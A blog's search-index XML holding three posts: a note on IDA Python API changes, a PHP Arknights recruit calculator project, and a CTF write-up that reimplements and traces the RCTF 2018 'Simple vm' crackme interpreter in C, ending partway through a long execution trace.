<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Changes of Python API in IDA</title>
    <url>/2022/09/25/Changes-of-Python-API-in-IDA/</url>
    <content><![CDATA[<h1 id="Changes-of-Python-API-in-IDA-7-x"><a href="#Changes-of-Python-API-in-IDA-7-x" class="headerlink" title="Changes of Python API in IDA 7.x"></a>Changes of Python API in IDA 7.x</h1><span id="more"></span>
<h4 id="From-IDA-6-x-to-IDA-7-x-there-has-been-lots-of-changes-And-as-a-green-hands-when-I-look-up-at-some-writes-up-some-method-just-didn’t-work-out-That’s-when-I-knew-that-many-python-API-has-change-from-IDA-6-x-to-IDA-7-x"><a href="#From-IDA-6-x-to-IDA-7-x-there-has-been-lots-of-changes-And-as-a-green-hands-when-I-look-up-at-some-writes-up-some-method-just-didn’t-work-out-That’s-when-I-knew-that-many-python-API-has-change-from-IDA-6-x-to-IDA-7-x" class="headerlink" title="From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x."></a>From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x.</h4><h4 id="Website-that-may-help-you"><a href="#Website-that-may-help-you" class="headerlink" title="Website that may help you:"></a>Website that may help you:</h4><h4 id="blog-in-chinese"><a href="#blog-in-chinese" class="headerlink" title="blog in chinese"></a><a href="https://ybrc.github.io/zh-cn/14-2/">blog in chinese</a></h4><h4 id="IDAPython-documentation"><a href="#IDAPython-documentation" class="headerlink" title="IDAPython documentation"></a><a href="https://hex-rays.com/products/ida/support/idapython_docs/">IDAPython documentation</a></h4><h4 id="hex-rays"><a href="#hex-rays" class="headerlink" title="hex-rays"></a><a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">hex-rays</a></h4>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>arknights recruit calculator(1)</title>
    <url>/2022/08/27/arknights-recruit-calculator/</url>
    <content><![CDATA[<h1 id="arknights-recruit-calculator-1"><a href="#arknights-recruit-calculator-1" class="headerlink" title="arknights recruit calculator(1)"></a>arknights recruit calculator(1)</h1><h5 id="Published-2022-x2F-08-x2F-27"><a href="#Published-2022-x2F-08-x2F-27" class="headerlink" title="Published: 2022&#x2F;08&#x2F;27"></a>Published: 2022&#x2F;08&#x2F;27</h5><h5 id="Updated-2022-x2F-08-x2F-27"><a href="#Updated-2022-x2F-08-x2F-27" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;27"></a>Updated: 2022&#x2F;08&#x2F;27</h5><h3 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h3><ul>
<li>I’m pretty addicted to this game named Arknights these days, and there is this module named “公招”(“recruit” in English or whatever). So there is this calculator tools use to help you recruit what you want on website. One day it the website&#x2F;procedure were been maintained. And I been studying php for couples of days. That’s when I decided to build my own recruit calculator.</li>
<li>It’s still in testing phase, when it’s complete, I may put it on a website.</li>
<li>The php function mention below can be consulted on <a href="https://www.php.net/">php.net</a><span id="more"></span></li>
</ul>
<hr>
<p>I use html, css to create the User Interface. User can input their tags(5 at most in one post), and program will output the cadres that fits(It will print all combination of the tags that are input).</p>
<p>The UI designed was easy(not to pursue a perfect, that is), just use a POST method and let the php program receive it. The backend devided the STRING into array, and search in the mysql.</p>
<p>There is this problem that HOW TO ESTABLISH THE SQL? There isn’t a sql you can find so easily that is ready made. The closest thing I found was a python dictionary. I wasn’t going to wrote the program in python. So I need to transform it into a PHP ARRAY. At first, I tried to use C to read the py dictionary. Obviously it’s too complicate and I should have better choose–<code>json.dumps()</code>,a function in python that can transform a dictionary into a json file. Like this:</p>
<blockquote>
<p><code>a=json.dumps(list)</code><br>However, it outputted errors. There I knew json.dumps cann’t dail with Chinese. So I searched for solutions and code down whese:</p>
</blockquote>
<blockquote>
<p><code>import json</code><br><code>import numpy as np</code><br><code>class Encoder(json.JSONEncoder):</code><br><code>    def default(self, obj):</code><br><code>        if isinstance(obj, np.ndarray):</code><br><code>            return obj.tolist()</code><br><code>        elif isinstance(obj, bytes):</code><br><code>            return str(obj, encoding=&#39;utf-8&#39;)</code><br><code>        return json.JSONEncoder.default(self, obj)</code><br><code>a=json.dumps(top_operators_list,cls=Encoder)</code><br><code>with open(&#39;tags.txt&#39;,&#39;a&#39;) as file0:</code><br><code>    print(a,file=file0)</code><br>It actually still output error. After few hours, I found the dictionary’s array used “{}” instead of “[]”. Correct all of that, it works and I got a json file containing the data I need.</p>
</blockquote>
<p>Now, I need to put the data in json file into a php array. Luckly, there is this function <code>json_decode</code> that can do the trick. So now the array was prepared.</p>
<p>To search the cadres, you can combine the array into a string in full permutation.(USING DFS) (TIPS:sort your string each time you search will make the work much easier.)</p>
<p>Designed the output UI, and it’s all done!</p>
]]></content>
      <tags>
        <tag>tools</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>VM</title>
    <url>/2023/03/03/VM/</url>
    <content><![CDATA[<h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h6 id="It’s-quite-a-while-since-last-been-working-out-a-reverse-problems-When-came-into-a-VM-golang-problem-in-VNCTF-I-spent-much-time-but-done-nothing-So-here-I-collect-some-VM-problems-and-tried-to-get-better-understand-of-the-thing"><a href="#It’s-quite-a-while-since-last-been-working-out-a-reverse-problems-When-came-into-a-VM-golang-problem-in-VNCTF-I-spent-much-time-but-done-nothing-So-here-I-collect-some-VM-problems-and-tried-to-get-better-understand-of-the-thing" class="headerlink" title="It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing."></a>It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing.</h6><span id="more"></span>
<h3 id="RCTF-2018-Simple-vm"><a href="#RCTF-2018-Simple-vm" class="headerlink" title="RCTF 2018 Simple vm"></a>RCTF 2018 Simple vm</h3><p><img src="/2023/03/03/VM/VM%5Cmain.png" alt="main"></p>
<p>From the main function, we see that v3 read the <code>p.bin</code> file. By <a href="https://cplusplus.com/reference/cstdio/fseek/">searching</a>, I marked the main function like this:</p>
<p><img src="/2023/03/03/VM/VM%5Cmain_0.png" alt="main_0"></p>
<p>And we know that <code>sub_400896</code> is where VM runs. So we can add breakpoint then step in and dynamic debug the function.</p>
<p><img src="/2023/03/03/VM/VM%5Csub_400896.png" alt="sub_400896"></p>
<p>We can see that <code>ptr</code> is a address and <code>v1[]</code> seems like our opcode. Well, if it’s the first time you do a vm problem, you might still confuse about what happen here. Howerver, we can stimulate the program our self:</p>
<style>
pre {
  overflow-y: auto;
  max-height: 300px;
}
</style>
<pre><code class="cpp">    #include&lt;bits/stdc++.h&gt;
    #include&lt;windows.h&gt;
    #include&lt;stdlib.h&gt;
    #define _BYTE unsigned char
    #define _DWORD unsigned int
    using namespace std;
    long long length_of_file;
    void * ptr;
    __int64 sub_400896();
    int dword_6010A4;
    int c;

    int main()&#123;
        FILE *v3; // rax
        const char *v4; // rdi
        FILE *v5; // rbx
        size_t v6; // rbp
        void *v8; // rax
        
        v3 = fopen(&quot;p.bin&quot;, &quot;rb&quot;);
        v4 = &quot;err 0&quot;;
        if ( !v3 )
            goto LABEL_4;
        v5 = v3;
        fseek(v3, 0LL, 2);
        length_of_file = ftell(v5);
        fseek(v5, 0LL, 0);
        v6 = length_of_file;
        if ( length_of_file &lt;= 0 )
        &#123;
            v4 = &quot;err 1&quot;;
            LABEL_4:
                puts(v4);
                return 0xFFFFFFFFLL;
        &#125;
        v8 = malloc(length_of_file);
        ptr = v8;
        v4 = &quot;err 3&quot;;
        if ( !v8 )
            goto LABEL_4;
        v4 = &quot;err 4&quot;;
        if ( length_of_file != fread(v8, 1uLL, v6, v5) )
            goto LABEL_4;
        fclose(v5);
        v4 = &quot;err 5&quot;;
        if ( (unsigned int)sub_400896() )
            goto LABEL_4;
        free(ptr);
        return 0LL;
    &#125;


    __int64 sub_400896()&#123;
        __int64 v0; // rax
        _BYTE *v1; // rbp
        int v2; // ebx
        __int64 v4; // rdx
        __int64 v5; // rax
        __int64 v6; // rax
        __int64 v7; // rax
        __int64 v8; // rax
        __int64 v9; // rax
        int v10; // eax
        __int64 v11; // rax
        char v12; // dl
        int v13; // eax
        int v14; // eax
        _BYTE *v15; // rax
        __int64 v16; // rax
        __int64 v17; // rax
        __int64 v18; // rax
        
        v0 = 0LL;
        v1 = (unsigned char*)ptr;
        while ( 1 )
        &#123;
            v2 = v0 + 1;
            switch ( v1[v0] )
            &#123;
            case 0:
                return *(unsigned int *)&amp;v1[v2];
            case 1:
                goto LABEL_35;
            case 2:
                v4 = v2;
                v2 = v0 + 9;
                v1[*(int *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(int)v0 + 5];
                break;
            case 3:
                v5 = v2;
                v2 += 4;
                v6 = *(int *)&amp;v1[v5];
                goto LABEL_27;
            case 4:
                v7 = v2;
                v2 += 4;
                v8 = *(int *)&amp;v1[v7];
                goto LABEL_31;
            case 5:
                v9 = v2;
                v2 += 4;
                v10 = (char)v1[*(int *)&amp;v1[v9]];
                goto LABEL_21;
            case 6:
                v11 = v2;
                v12 = dword_6010A4;
                v2 += 4;
                v8 = *(int *)&amp;v1[v11];
                goto LABEL_9;
            case 7:
                v13 = dword_6010A4;
                goto LABEL_23;
            case 8:
                v14 = ~(dword_6010A4 &amp; c);
                goto LABEL_12;
            case 0xA:
                v14 = getchar();
                goto LABEL_12;
            case 0xB:
                putchar(c);
                break;
            case 0xC:
                v15 = &amp;v1[*(int *)&amp;v1[v2]];
                if ( *v15 )&#123;
                    v2 = *(_DWORD *)&amp;v1[v2 + 4];
                    --*v15;
                &#125;
                else&#123;
                    v2 += 8;
                &#125;
                break;
            case 0xD:
                ++c;
                break;
            case 0xE:
                ++dword_6010A4;
                break;
            case 0xF:
                v14 = dword_6010A4;
                goto LABEL_12;
            case 0x10:
                v10 = c;
                goto LABEL_21;
            case 0x11:
                v16 = v2;
                v2 += 4;
                v13 = *(_DWORD *)&amp;v1[v16];
                LABEL_23:
                    c += v13;
                    break;
            case 0x12:
                v6 = dword_6010A4;
                goto LABEL_27;
            case 0x13:
                v6 = c;
                LABEL_27:
                    v14 = (char)v1[v6];
                    goto LABEL_12;
            case 0x14:
                v17 = v2;
                v2 += 4;
                v14 = *(_DWORD *)&amp;v1[v17];
                goto LABEL_12;
            case 0x15:
                v18 = v2;
                v2 += 4;
                v10 = *(_DWORD *)&amp;v1[v18];
                LABEL_21:
                    dword_6010A4 = v10;
                    break;
            case 0x16:
                v8 = dword_6010A4;
                LABEL_31:
                    v12 = c;
                    LABEL_9:
                        v1[v8] = v12;
                        break;
            case 0x17:
                v14 = c - dword_6010A4;
                LABEL_12:
                    c = v14;
                    break;
            case 0x18:
                if ( c )
                    LABEL_35:
                        v2 = *(_DWORD *)&amp;v1[v2];
                else
                    v2 = v0 + 5;
                break;
            default:
                break;
            &#125;
            if ( v2 &gt;= length_of_file )
                return 0LL;
            v0 = v2;
        &#125;
    &#125;
</code></pre>
<p>and we can add some outputs, so as to understand this program:</p>
<pre><code class="cpp">    #include&lt;bits/stdc++.h&gt;
    #include&lt;windows.h&gt;
    #include&lt;stdlib.h&gt;
    #define _BYTE unsigned char
    #define _DWORD unsigned int
    using namespace std;
    long long length_of_file;
    void * ptr;
    __int64 sub_400896();
    int dword_6010A4;
    int c;

    int main()&#123;
        ofstream outfile;
        FILE *v3; // rax
        const char *v4; // rdi
        FILE *v5; // rbx
        size_t v6; // rbp
        void *v8; // rax
        
        v3 = fopen(&quot;p.bin&quot;, &quot;rb&quot;);
        v4 = &quot;err 0&quot;;
        if ( !v3 )
            goto LABEL_4;
        v5 = v3;
        fseek(v3, 0LL, 2);
        length_of_file = ftell(v5);
        fseek(v5, 0LL, 0);
        v6 = length_of_file;
        if ( length_of_file &lt;= 0 )
        &#123;
            v4 = &quot;err 1&quot;;
            LABEL_4:
                puts(v4);
                return 0xFFFFFFFFLL;
        &#125;
        v8 = malloc(length_of_file);
        ptr = v8;
        v4 = &quot;err 3&quot;;
        if ( !v8 )
            goto LABEL_4;
        v4 = &quot;err 4&quot;;
        if ( (long long unsigned int)length_of_file != fread(v8, 1uLL, v6, v5) )
            goto LABEL_4;
        fclose(v5);
        v4 = &quot;err 5&quot;;
        if ( (unsigned int)sub_400896() )
            goto LABEL_4;
        free(ptr);
        return 0LL;
    &#125;


    __int64 sub_400896()&#123;
        __int64 v0; // rax
        _BYTE *v1; // rbp
        int v2; // ebx
        __int64 v4; // rdx
        __int64 v5; // rax
        __int64 v6; // rax
        __int64 v7; // rax
        __int64 v8; // rax
        __int64 v9; // rax
        int v10; // eax
        __int64 v11; // rax
        char v12; // dl
        int v13; // eax
        int v14; // eax
        _BYTE *v15; // rax
        __int64 v16; // rax
        __int64 v17; // rax
        __int64 v18; // rax
        
        v0 = 0LL;
        v1 = (unsigned char*)ptr;
        while ( 1 )
        &#123;
            v2 = v0 + 1;
    //		printf(&quot;v2 = v0 + 1;\n&quot;);
            switch ( v1[v0] )
            &#123;
            case 0:
                cout&lt;&lt;&quot;return \n&quot;&lt;&lt;*(unsigned int *)&amp;v1[v2]&lt;&lt;endl;
                return *(unsigned int *)&amp;v1[v2];
            case 1:
                goto LABEL_35;
            case 2:
                v4 = v2;
                v2 = v0 + 9;
                v1[*(int *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(int)v0 + 5];
    //			printf(&quot;v4 = v2\n&quot;);
    //			printf(&quot;v2 = v0 + 9\n&quot;);
                printf(&quot;v1[%d] = %u\n&quot;,*(int *)&amp;v1[v4],*(_DWORD *)&amp;v1[(int)v0 + 5]);
                break;
            case 3:
                v5 = v2;
                v2 += 4;
                v6 = *(int *)&amp;v1[v5];
    //			printf(&quot;v5 = v2\n&quot;);
    //			printf(&quot;v2 += 4\n&quot;);
    //			printf(&quot;v6 = v1[%lld] (%d)\n&quot;,v5,*(int *)&amp;v1[v5]);
                goto LABEL_27;
            case 4:
                v7 = v2;
                v2 += 4;
                v8 = *(int *)&amp;v1[v7];
                printf(&quot;v7 = v2\n&quot;);
    //			printf(&quot;v2 += 4\n&quot;);
                printf(&quot;v8 = v1[%lld] (%d)\n&quot;,v7,*(int *)&amp;v1[v7]);
                goto LABEL_31;
            case 5:
                v9 = v2;
                v2 += 4;
                v10 = (char)v1[*(int *)&amp;v1[v9]];
    //			printf(&quot;v9 = v2\n&quot;);
    //			printf(&quot;v2 += 4\n&quot;);
                printf(&quot;v10 = v1[%d] (%d)\n&quot;,*(int *)&amp;v1[v9],(char)v1[*(int *)&amp;v1[v9]]);
                goto LABEL_21;
            case 6:
                v11 = v2;			
                v12 = dword_6010A4;
                v2 += 4;
                v8 = *(int *)&amp;v1[v11];
    //			printf(&quot;v11 = v2\n&quot;);
                printf(&quot;v12 = dword_6010A4\n&quot;);
    //			printf(&quot;v2 +=4\n&quot;);
                printf(&quot;v8 = v1[%lld] (%d)\n&quot;,v11,*(int *)&amp;v1[v11]);
                goto LABEL_9;
            case 7:
                v13 = dword_6010A4;
                printf(&quot;v13 = dwod_6010A4 (%d)\n&quot;,dword_6010A4);
                goto LABEL_23;
            case 8:
                v14 = ~(dword_6010A4 &amp; c);
                printf(&quot;dword_6010A4 = %d ; c = %d\n&quot;,dword_6010A4,c);
                printf(&quot;v14 = dword_6010A4 nand c\n&quot;);
                goto LABEL_12;
            case 0xA:
                printf(&quot;input:\n&quot;);
                v14 = getchar();
                goto LABEL_12;	
            case 0xB:																						//the output of judgement
                printf(&quot;output:\n&quot;);
                putchar(c);
                break;
            case 0xC:
                v15 = &amp;v1[*(int *)&amp;v1[v2]];
                printf(&quot;v15 = &amp;v1[%d] (%d)\n&quot;,*(int *)&amp;v1[v2],v1[*(int *)&amp;v1[v2]]);
                if ( *v15 )&#123;
                    v2 = *(_DWORD *)&amp;v1[v2 + 4];
                    --*v15;
    //				printf(&quot;v2 = v1[%d]\n&quot;,v2+4);
                    printf(&quot;--*v15\n&quot;);
                &#125;
                else&#123;
    //				printf(&quot;v2 += 8\n&quot;);
                    v2 += 8;
                &#125;
                break;
            case 0xD:
                ++c;
                printf(&quot;c++\n&quot;);
                break;
            case 0xE:
                ++dword_6010A4;
                printf(&quot;dword_6010A4++\n&quot;);
                break;
            case 0xF:
                v14 = dword_6010A4;
                printf(&quot;v14 = dword_6010A4\n&quot;);
                goto LABEL_12;
            case 0x10:
                v10 = c;
                printf(&quot;v10 = c(%d)\n&quot;,c);
                goto LABEL_21;
            case 0x11:
                v16 = v2;
                v2 += 4;
                v13 = *(_DWORD *)&amp;v1[v16];
                printf(&quot;v13 = v1[%lld] (%d)\n&quot;,v16,c);
    //			printf(&quot;v16 = v2 (%d)\n&quot;,v2);
    //			printf(&quot;v2 += 2\n&quot;);
                LABEL_23:
                    c += v13;
                    printf(&quot;c += v13\n&quot;);
                    break;
            case 0x12:
                v6 = dword_6010A4;
    //			printf(&quot;v6 = dword_6010A4\n&quot;);
                goto LABEL_27;
            case 0x13:
                v6 = c;
                printf(&quot;v6 = c\n&quot;);
                LABEL_27:
                    v14 = (char)v1[v6];
                    printf(&quot;v14 = v1[%d] (%c)\n&quot;,v6,v14);
                    goto LABEL_12;
            case 0x14:
                v17 = v2;
                v2 += 4;
                v14 = *(_DWORD *)&amp;v1[v17];
                printf(&quot;v14 =v1[%lld] (%d)\n&quot;,v17,v14);
                goto LABEL_12;
            case 0x15:
                v18 = v2;
                v2 += 4;
                v10 = *(_DWORD *)&amp;v1[v18];
                printf(&quot;v10 =v1[%lld] (%d)\n&quot;,v18,v10);
                LABEL_21:
                    dword_6010A4 = v10;
                    printf(&quot;dword_6010A4 = v10\n&quot;);
                    break;
            case 0x16:
                v8 = dword_6010A4;
                printf(&quot;v8 = dword_6010A4\n&quot;);
                LABEL_31:
                    v12 = c;
                    printf(&quot;v12 = c\n&quot;);
                    LABEL_9:
                        v1[v8] = v12;
                        printf(&quot;v1[%lld] = v12 (%d)\n&quot;,v8,v12);
                        break;
            case 0x17:
                v14 = c - dword_6010A4;
                printf(&quot;__dword_6010A4 = %d     c = %d\n&quot;,dword_6010A4,c);
                printf(&quot;v14 = c - dword_6010A4\n&quot;);
                LABEL_12:
                    c = v14;
                    printf(&quot;c = v14\n&quot;);
                    break;
            case 0x18:
                if ( c )&#123;
                    LABEL_35:
    //					printf(&quot;v2 = v1[%d]\n&quot;,v2);
                        v2 = *(_DWORD *)&amp;v1[v2];
                &#125;
                else&#123;
                    v2 = v0 + 5;
    //				printf(&quot;v2 = v0 + 5\n&quot;);
                &#125;
                break;
            default:
                break;
            &#125;
            if ( v2 &gt;= length_of_file )&#123;
                printf(&quot;length end\nreturn;\n&quot;);
                return 0LL;
            &#125;
                
            v0 = v2;
        &#125;
    &#125;
</code></pre>
<p>outputs:</p>
<pre><code>v10 =v1[49] (256)
dword_6010A4 = v10
dword_6010A4++
v14 = v1[257] (I)
c = v14
output:
Iv15 = &amp;v1[256] (10)
--*v15
dword_6010A4++
v14 = v1[258] (n)
c = v14
output:
nv15 = &amp;v1[256] (9)
--*v15
dword_6010A4++
v14 = v1[259] (p)
c = v14
output:
pv15 = &amp;v1[256] (8)
--*v15
dword_6010A4++
v14 = v1[260] (u)
c = v14
output:
uv15 = &amp;v1[256] (7)
--*v15
dword_6010A4++
v14 = v1[261] (t)
c = v14
output:
tv15 = &amp;v1[256] (6)
--*v15
dword_6010A4++
v14 = v1[262] ( )
c = v14
output:
 v15 = &amp;v1[256] (5)
--*v15
dword_6010A4++
v14 = v1[263] (F)
c = v14
output:
Fv15 = &amp;v1[256] (4)
--*v15
dword_6010A4++
v14 = v1[264] (l)
c = v14
output:
lv15 = &amp;v1[256] (3)
--*v15
dword_6010A4++
v14 = v1[265] (a)
c = v14
output:
av15 = &amp;v1[256] (2)
--*v15
dword_6010A4++
v14 = v1[266] (g)
c = v14
output:
gv15 = &amp;v1[256] (1)
--*v15
dword_6010A4++
v14 = v1[267] (:)
c = v14
output:
:v15 = &amp;v1[256] (0)
v10 =v1[67] (272)
dword_6010A4 = v10
dword_6010A4++
input:
00000000000000000000000000000000000000
c = v14
v8 = dword_6010A4
v12 = c
v1[273] = v12 (48)
v15 = &amp;v1[272] (31)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[274] = v12 (48)
v15 = &amp;v1[272] (30)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[275] = v12 (48)
v15 = &amp;v1[272] (29)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[276] = v12 (48)
v15 = &amp;v1[272] (28)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[277] = v12 (48)
v15 = &amp;v1[272] (27)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[278] = v12 (48)
v15 = &amp;v1[272] (26)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[279] = v12 (48)
v15 = &amp;v1[272] (25)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[280] = v12 (48)
v15 = &amp;v1[272] (24)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[281] = v12 (48)
v15 = &amp;v1[272] (23)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[282] = v12 (48)
v15 = &amp;v1[272] (22)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[283] = v12 (48)
v15 = &amp;v1[272] (21)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[284] = v12 (48)
v15 = &amp;v1[272] (20)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[285] = v12 (48)
v15 = &amp;v1[272] (19)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[286] = v12 (48)
v15 = &amp;v1[272] (18)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[287] = v12 (48)
v15 = &amp;v1[272] (17)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[288] = v12 (48)
v15 = &amp;v1[272] (16)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[289] = v12 (48)
v15 = &amp;v1[272] (15)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[290] = v12 (48)
v15 = &amp;v1[272] (14)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[291] = v12 (48)
v15 = &amp;v1[272] (13)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[292] = v12 (48)
v15 = &amp;v1[272] (12)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[293] = v12 (48)
v15 = &amp;v1[272] (11)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[294] = v12 (48)
v15 = &amp;v1[272] (10)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[295] = v12 (48)
v15 = &amp;v1[272] (9)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[296] = v12 (48)
v15 = &amp;v1[272] (8)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[297] = v12 (48)
v15 = &amp;v1[272] (7)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[298] = v12 (48)
v15 = &amp;v1[272] (6)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[299] = v12 (48)
v15 = &amp;v1[272] (5)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[300] = v12 (48)
v15 = &amp;v1[272] (4)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[301] = v12 (48)
v15 = &amp;v1[272] (3)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[302] = v12 (48)
v15 = &amp;v1[272] (2)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[303] = v12 (48)
v15 = &amp;v1[272] (1)
--*v15
dword_6010A4++
input:
c = v14
v8 = dword_6010A4
v12 = c
v1[304] = v12 (48)
v15 = &amp;v1[272] (0)
v14 = v1[320] ( )
c = v14
v10 = c(32)
dword_6010A4 = v10
v13 = v1[92] (32)
c += v13
v6 = c
v14 = v1[273] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 32 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] ( )
c = v14
dword_6010A4 = -33 ; c = 32
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-1)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -1
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (16)
v14 = v1[320] ( )
c = v14
v13 = v1[150] (32)
c += v13
v10 = c(273)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[273] = v12 (16)
v10 = v1[320] (32)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (33)
v15 = &amp;v1[325] (31)
--*v15
v14 = v1[320] (!)
c = v14
v10 = c(33)
dword_6010A4 = v10
v13 = v1[92] (33)
c += v13
v6 = c
v14 = v1[274] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (!)
c = v14
dword_6010A4 = -33 ; c = 33
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-2)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -2
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (17)
v14 = v1[320] (!)
c = v14
v13 = v1[150] (33)
c += v13
v10 = c(274)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[274] = v12 (17)
v10 = v1[320] (33)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (34)
v15 = &amp;v1[325] (30)
--*v15
v14 = v1[320] (&quot;)
c = v14
v10 = c(34)
dword_6010A4 = v10
v13 = v1[92] (34)
c += v13
v6 = c
v14 = v1[275] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 34 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (&quot;)
c = v14
dword_6010A4 = -33 ; c = 34
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-3)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -3
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (18)
v14 = v1[320] (&quot;)
c = v14
v13 = v1[150] (34)
c += v13
v10 = c(275)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[275] = v12 (18)
v10 = v1[320] (34)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (35)
v15 = &amp;v1[325] (29)
--*v15
v14 = v1[320] (#)
c = v14
v10 = c(35)
dword_6010A4 = v10
v13 = v1[92] (35)
c += v13
v6 = c
v14 = v1[276] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 35 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (#)
c = v14
dword_6010A4 = -33 ; c = 35
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-4)
v14 = v1[321] (�)
